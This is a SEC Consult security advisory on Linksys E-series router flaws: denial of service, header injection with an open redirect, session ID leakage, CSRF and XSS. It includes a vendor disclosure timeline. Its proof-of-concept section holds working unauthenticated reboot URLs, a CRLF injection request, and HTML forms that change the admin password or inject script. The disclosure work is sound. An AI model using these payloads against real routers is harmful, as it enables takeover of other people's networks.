@@ -1,0 +1,435 @@
+SEC Consult Vulnerability Lab Security Advisory < 20171018-1 >
+=======================================================================
+              title: Multiple vulnerabilities
+            product: Linksys E series, see "Vulnerable / tested versions"
+ vulnerable version: see "Vulnerable / tested versions"
+      fixed version: no public fix, see solution/timeline
+         CVE number: -
+             impact: high
+           homepage: http://www.linksys.com/
+              found: 2017-06-26
+                 by: T. Weber (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Today, Belkin International has three brands – Belkin, Linksys and WeMo
+– to enhance the technology that connects us to the people, activities
+and experiences we love. Belkin products are renowned for their
+simplicity and ease of use, while our Linksys brand helped make
+wireless connectivity mainstream around the globe. Our newest brand,
+WeMo, is the leader in delivering customizable smart home experiences.
+Its product platform empowers people to monitor, measure and manage
+their electronics, appliances and lighting at home and on-the-go."
+
+Source: http://www.belkin.com/uk/aboutUs/
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends not to use this product in a production environment
+until a thorough security review has been performed by security
+professionals and all identified issues have been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Denial of Service (DoS)
+A denial of service vulnerability is present in the web server of the
+device. This vulnerability is very simple to trigger since a single GET
+request to a cgi-script is sufficient.
+
+A crafted GET request, e.g. triggered by CSRF over a user in the
+internal network, can reboot the whole device or freeze the web interface
+and the DHCP service. This action does not require authentication.
+
+2) HTTP Header Injection & Open Redirect
+Due to a flaw in the web service a header injection can be triggered
+without authentication. This kind of vulnerability can be used to perform
+different arbitrary actions. One example in this case is an open redirection
+to another web site. In the worst case a session ID of an authenticated user
+can be stolen this way because the session ID is embedded into the url
+which is another flaw of the web service.
+
+3) Improper Session-Protection
+The session ID for administrative users can be fetched from the device from
+LAN without credentials because of insecure session handling.
+This vulnerability can only be exploited when an administrator was
+authenticated to the device before the attack and opened a session previously.
+
+The login works if the attacker has the same IP address as the PC
+of the legitimate administrator. Therefore, a CSRF attack is possible when
+the administrator is lured to surf on a malicious web site or to click on
+a malicious link.
+
+4) Cross-Site Request Forgery Vulnerability in Admin Interface
+A cross-site request forgery vulnerability can be triggered in the
+administrative interface. This vulnerability can be exploited because the
+session ID can be hijacked by using 3) via LAN. An exploitation via internet
+is only possible if the session id is exposed to the internet (for example via
+the referrer).
+
+An attacker can change any configuration of the device by luring a user to
+click on a malicious link or surf to a malicious web-site.
+
+5) Cross-Site Scripting Vulnerability in Admin Interface
+A cross-site scripting vulnerability can be triggered in the administrative
+interface. This vulnerability can be exploited because the session ID can
+be hijacked by using 3) via LAN. An exploitation via internet is only possible
+if the session id is exposed to the internet (for example via the referrer).
+
+By using this vulnerability, malicious code can be executed in the context of
+the browser session of the attacked user.
+
+
+Proof of concept:
+-----------------
+1) Denial of Service
+
+Unauthenticated request for triggering a router reboot in browser:
+http://<Router-IP>/upgrade.cgi
+http://<Router-IP>/restore.cgi
+
+Unauthenticated request for triggering a router freeze in browser:
+http://<Router-IP>/mfgtst.cgi
+
+
+2) HTTP Header Injection & Open Redirect
+
+A header injection can be triggered by the following unauthenticated request:
+
+Request:
+------------------------------------------------------------------------------
+POST /UnsecuredEnable.cgi HTTP/1.1
+Host: <Router-IP>
+Accept: */*
+Accept-Language: en
+Connection: close
+Referer: http://<Router-IP>/Unsecured.cgi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+
+submit_type=&submit_button=UnsecuredEnable&gui_action=Apply&wait_time=19&next_url=INJEC%0d%0aTION&change_action=
+------------------------------------------------------------------------------
+
+Response:
+------------------------------------------------------------------------------
+HTTP/1.1 302 Redirect
+Server: httpd
+Date: Thu, 01 Jan 1970 00:27:41 GMT
+Location: http://INJEC
+TION
+Content-Type: text/plain
+Connection: close
+------------------------------------------------------------------------------
+
+Setting a new location will result in an open redirect:
+
+Request:
+------------------------------------------------------------------------------
+POST /UnsecuredEnable.cgi HTTP/1.1
+Host: <Router-IP>
+Accept: */*
+Accept-Language: en
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+
+submit_type=&submit_button=UnsecuredEnable&gui_action=Apply&wait_time=19&next_url=www.sec-consult.com&change_action=
+------------------------------------------------------------------------------
+Response:
+------------------------------------------------------------------------------
+HTTP/1.1 302 Redirect
+Server: httpd
+Date: Thu, 01 Jan 1970 00:27:57 GMT
+Location: http://www.sec-consult.com
+Content-Type: text/plain
+Connection: close
+------------------------------------------------------------------------------
+
+3) Improper Session-Protection
+These two requests can be used to fetch the current session ID of an authenticated
+user.
+
+http://<Device-IP>/BlockTime.asp
+http://<Device-IP>/BlockSite.asp
+
+The response is nearly the same (except the "inetblock" and "blocksite"
+functions):
+-------------------------------------------------------------------------------
+HTTP/1.1 200 Ok
+Server: httpd
+Date: Thu, 01 Jan 1970 00:04:32 GMT
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: 0
+Content-Type: text/html
+
+[...]
+
+function init()
+{
+    var close_session = "0";
+    if ( close_session == "1" )
+    {
+        document.forms[0].action= "hndUnblock.cgi";
+    }
+    else
+    {
+        document.forms[0].action= "hndUnblock.cgi?session_id=<Session-ID>";
+    }
+
+}
+
+</script>
+</head>
+<body id="blocked" onload=init()>
+<div id="content">
+<div class="h1">
+<h1><span><script>Capture(hndmsg.blocksite)</script>
+</span>
+</h1>
+</div>
+
+[...]
+
+</body>
+</html>
+-------------------------------------------------------------------------------
+
+4) Cross-Site Request Forgery Vulnerability in Admin Interface
+The following proof of concept HTML code can change the router password by
+exploiting CSRF after replacing the <Session-ID> with the fetched one from 3).
+
+The new password is "secconsult".
+-------------------------------------------------------------------------------
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/apply.cgi?session_id=<Session-ID>" method="POST">
+      <input type="hidden" name="submit&#95;button" value="Management" />
+      <input type="hidden" name="change&#95;action" value="" />
+      <input type="hidden" name="gui&#95;action" value="Apply" />
+      <input type="hidden" name="PasswdModify" value="1" />
+      <input type="hidden" name="http&#95;enable" value="1" />
+      <input type="hidden" name="https&#95;enable" value="0" />
+      <input type="hidden" name="ctm404&#95;enable" value="" />
+      <input type="hidden" name="remote&#95;mgt&#95;https" value="0" />
+      <input type="hidden" name="wait&#95;time" value="4" />
+      <input type="hidden" name="need&#95;reboot" value="0" />
+      <input type="hidden" name="http&#95;passwd" value="secconsult" />
+      <input type="hidden" name="http&#95;passwdConfirm" value="secconsult" />
+      <input type="hidden" name="&#95;http&#95;enable" value="1" />
+      <input type="hidden" name="web&#95;wl&#95;filter" value="0" />
+      <input type="hidden" name="remote&#95;management" value="0" />
+      <input type="hidden" name="nf&#95;alg&#95;sip" value="0" />
+      <input type="hidden" name="upnp&#95;enable" value="1" />
+      <input type="hidden" name="upnp&#95;config" value="1" />
+      <input type="hidden" name="upnp&#95;internet&#95;dis" value="0" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+-------------------------------------------------------------------------------
+
+
+5) Cross-Site Scripting Vulnerability in Admin Interface
+The <Session-ID> must be replaced again. The "apply.cgi" script can be abused
+to trigger the cross-site scripting vulnerability.
+
+-------------------------------------------------------------------------------
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/apply.cgi?session_id=<Session-ID>" method="POST">
+      <input type="hidden" name="submit&#95;button" value="index" />
+      <input type="hidden" name="change&#95;action" value="" />
+      <input type="hidden" name="submit&#95;type" value="" />
+      <input type="hidden" name="gui&#95;action" value="Apply" />
+      <input type="hidden" name="now&#95;proto" value="dhcp" />
+      <input type="hidden" name="daylight&#95;time" value="1" />
+      <input type="hidden" name="switch&#95;mode" value="0" />
+      <input type="hidden" name="hnap&#95;devicename" value="csrft_POC" />
+      <input type="hidden" name="need&#95;reboot" value="0" />
+      <input type="hidden" name="user&#95;language" value="" />
+      <input type="hidden" name="wait&#95;time" value="1';alert('XSS-PoC')//155" />
+      <input type="hidden" name="dhcp&#95;start" value="100" />
+      <input type="hidden" name="dhcp&#95;start&#95;conflict" value="0" />
+      <input type="hidden" name="lan&#95;ipaddr" value="4" />
+      <input type="hidden" name="ppp&#95;demand&#95;pppoe" value="9" />
+      <input type="hidden" name="ppp&#95;demand&#95;pptp" value="9" />
+      <input type="hidden" name="ppp&#95;demand&#95;l2tp" value="9" />
+      <input type="hidden" name="ppp&#95;demand&#95;hb" value="9" />
+      <input type="hidden" name="wan&#95;ipv6&#95;proto" value="dhcp" />
+      <input type="hidden" name="detect&#95;lang" value="en" />
+      <input type="hidden" name="wan&#95;proto" value="dhcp" />
+      <input type="hidden" name="wan&#95;hostname" value="" />
+      <input type="hidden" name="wan&#95;domain" value="" />
+      <input type="hidden" name="mtu&#95;enable" value="0" />
+      <input type="hidden" name="lan&#95;ipaddr&#95;0" value="192" />
+      <input type="hidden" name="lan&#95;ipaddr&#95;1" value="168" />
+      <input type="hidden" name="lan&#95;ipaddr&#95;2" value="1" />
+      <input type="hidden" name="lan&#95;ipaddr&#95;3" value="1" />
+      <input type="hidden" name="lan&#95;netmask" value="255&#46;255&#46;255&#46;0" />
+      <input type="hidden" name="machine&#95;name" value="Linksys09355" />
+      <input type="hidden" name="lan&#95;proto" value="dhcp" />
+      <input type="hidden" name="dhcp&#95;check" value="" />
+      <input type="hidden" name="dhcp&#95;start&#95;tmp" value="100" />
+      <input type="hidden" name="dhcp&#95;num" value="50" />
+      <input type="hidden" name="dhcp&#95;lease" value="0" />
+      <input type="hidden" name="wan&#95;dns" value="4" />
+      <input type="hidden" name="wan&#95;dns0&#95;0" value="0" />
+      <input type="hidden" name="wan&#95;dns0&#95;1" value="0" />
+      <input type="hidden" name="wan&#95;dns0&#95;2" value="0" />
+      <input type="hidden" name="wan&#95;dns0&#95;3" value="0" />
+      <input type="hidden" name="wan&#95;dns1&#95;0" value="0" />
+      <input type="hidden" name="wan&#95;dns1&#95;1" value="0" />
+      <input type="hidden" name="wan&#95;dns1&#95;2" value="0" />
+      <input type="hidden" name="wan&#95;dns1&#95;3" value="0" />
+      <input type="hidden" name="wan&#95;dns2&#95;0" value="0" />
+      <input type="hidden" name="wan&#95;dns2&#95;1" value="0" />
+      <input type="hidden" name="wan&#95;dns2&#95;2" value="0" />
+      <input type="hidden" name="wan&#95;dns2&#95;3" value="0" />
+      <input type="hidden" name="wan&#95;wins" value="4" />
+      <input type="hidden" name="wan&#95;wins&#95;0" value="0" />
+      <input type="hidden" name="wan&#95;wins&#95;1" value="0" />
+      <input type="hidden" name="wan&#95;wins&#95;2" value="0" />
+      <input type="hidden" name="wan&#95;wins&#95;3" value="0" />
+      <input type="hidden" name="time&#95;zone" value="&#45;08&#32;1&#32;1" />
+      <input type="hidden" name="&#95;daylight&#95;time" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+-------------------------------------------------------------------------------
+
+
+Vulnerable / tested versions:
+-----------------------------
+Linksys E2500 - 3.0.02 (build 2)
+
+According to the Linksys security contact the following products are
+affected too:
+Linksys E900 (Version: 1.0.06)
+Linksys E1200 (Version: 2.0.07 Build 5)
+Linksys E8400 AC2400 Dual-Band Wi-Fi Router (Version: basic version ?)
+
+
+Based on information embedded in the firmware of other Linksys products
+gathered from our IoT Inspector tool we believe the following devices
+are affected as well:
+
+Linksys E900 (Version: 1.0.06)            -- confirmed by vendor
+Linksys E900-ME (Version: 1.0.06)
+Linksys E1200 (Version: 2.0.07 Build 5)   -- confirmed by vendor
+Linksys E1500 (Version: 1.0.06 Build 1)
+Linksys E3200 (Version: 1.0.05 Build 2)
+Linksys E4200 (Version: 1.0.06 Build 3)
+Linksys WRT54G2 (Version: 1.5.02 Build 5)
+
+
+Vendor contact timeline:
+------------------------
+2017-07-10: Contacting vendor through security@linksys.com. Set release date
+            to 2017-08-29.
+2017-07-12: Confirmation of recipient. The contact also states that
+            the unit is older and they have to look for it.
+2017-08-07: Asking for update; Contact responds that they have to look for
+            such a unit in their inventory.
+2017-08-08: Contact responds that he verified three of four vulnerabilities.
+2017-08-09: Sent PCAP dump and more information about vulnerability #4 to
+            assist the contact with verification.
+2017-08-18: Sending new advisory version to contact and asking for an update;
+            No answer.
+2017-08-22: Asking for an update; Contact states that he is trying to get a
+            fixed firmware from the OEM.
+2017-08-24: Asked the vendor how much additional time he will need.
+2017-08-25: Vendor states that it is difficult to get an update from the OEM
+            due to the age of the product ("Many of the engineers who
+            originally worked on this code base are no longer with the
+            company"). Clarified some CORS/SOP issues which were
+            misunderstood.
+2017-08-30: Sending Proof of Concept for CSRF/XSS as HTML files to the vendor.
+            Changed the vulnerability description of the advisory to
+            explain the possibility of exploiting the CSRF/XSS vulnerabilities
+            from LAN and WAN side.
+2017-09-07: Asking for an update; Vendor agrees with the new vulnerability
+            descriptions and states that the OEM got back to them with a fix
+            for the E2500 and they are in the QA phase. The vendor is expecting
+            fixes for E900, E1200, and E8400 later this week or next week to
+            hand them over to QA.
+2017-09-07: Stated that E8400 was not found by the IoT Inspector because there
+            was no firmware available to download online. Stated that it will
+            be available in the next version of the advisory. Shifting the
+            advisory release to 2017-09-26.
+            Asking for confirmation of the other reported devices:
+            Linksys E900-ME (Version: 1.0.06)
+            Linksys E1500 (Version: 1.0.06 Build 1)
+            Linksys E3200 (Version: 1.0.05 Build 2)
+            Linksys E4200 (Version: 1.0.06 Build 3)
+            Linksys WRT54G2 (Version: 1.5.02 Build 5)
+            No answer.
+2017-09-18: Sending new version of the advisory to the vendor. Asking for an
+            update; No answer.
+2017-09-21: Asking for an update; No answer.
+2017-09-26: Asking for an update; No answer.
+2017-10-02: Asking for an update and shifting the advisory release to
+            2017-10-09; No answer.
+2017-10-16: Informing the vendor that the advisory will be released on
+            2017-10-18 because vendor is unresponsive.
+2017-10-18: Public release of security advisory
+
+
+Solution:
+---------
+Upgrade to new firmware version as soon as the vendor publishes it.
+
+
+Workaround:
+-----------
+Restrict network access to the device.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://sec-consult.com/en/career/index.html
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://sec-consult.com/en/contact/index.html
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF T. Weber / @2017
